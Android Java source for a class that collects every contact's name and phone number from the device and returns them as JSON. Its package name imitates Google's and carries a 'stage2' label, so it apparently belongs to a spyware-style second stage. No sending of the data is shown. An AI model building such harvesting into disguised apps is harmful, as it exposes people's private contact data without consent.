package com.google.android.apps.work.stage2;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsInfoGatherer {

    public static String getAllContacts(Context context) {
        JSONArray jsonArray = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };

        try (Cursor cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null,
                null,
                null)) {

            if (cursor != null) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                while (cursor.moveToNext()) {
                    String name = cursor.getString(nameIndex);
                    String number = cursor.getString(numberIndex);

                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contact.put("number", number);
                    jsonArray.put(contact);
                }
            }
        } catch (Exception e) {
            Log.e("ContactsGatherer", "Error gathering contacts", e);
        }

        return jsonArray.toString();
    }
}
